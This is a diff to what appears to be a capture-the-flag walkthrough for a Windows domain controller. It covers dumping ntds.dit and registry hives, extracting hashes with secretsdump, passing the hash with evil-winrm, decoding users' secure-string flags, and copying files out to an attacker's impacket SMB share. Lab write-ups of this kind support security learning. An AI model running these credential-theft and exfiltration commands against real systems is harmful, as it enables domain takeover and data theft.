@@ -34,3 +34,16 @@ uments -include:c:\windows\ntds\`. This will put the backup in the user's docume
 10. To extract the ntds.dit, the version id of the backup can be obtained via `wbadmin get versions`, and then the file can be gathered via `echo Y | wbadmin start recovery -itemtype:file -items:C:\windows\ntds\ntds.dit -recoverytarget:Z:\ -notrestoreacl -version:<version-id>`
 11. Finally, gathering the sam hive and system hive via `reg save hklm\sam sam.save` and `reg save hklm\system system.save`, the hashes for users can be extracted via `secretsdump.py -system System.hive -sam Sam.hive -ntds ntds.dit LOCAL`.
 12. With the admin hash from above, complete system compromise can be obtained via evil-winrm and passing the hash: `evil-winrm -i <ip> -u administrator -H <hash>`
+
+With admin some flags are readable, and the system can be enumerated completely. However, there are flags in the lvetrova and xyan1d3 user folders which are encoded as powershell/.net secure strings: these can only be decoded as the user in question. lvetrova can be logged on via her hash just as admin. Then, running a command like the following will read the flag: `(Import-Clixml -Path ".\lvetrova.xml").GetNetworkCredential().Password`.
+
+Other flags are hex encoded, inside a dummy exe file, and in secret folders, `Program Files/Top Secret` and `Windows/trash`. The trash folder is intended to be accessed over smb, it looks, but can be opened directly via admin.
+
+## Getting files back to the kali box
+
+For getting files from the windows machine to an attack host:
+
+- open a smb share using impacket on the attack host: `smbserver.py share . -username share -password share -smb2support`
+- map a drive to this share via net use (for some reason, direct copy never seemed to work): `net use z: \\10.10.61.105\share /user:share share`
+
+Then you can just copy files normally to `z:\`
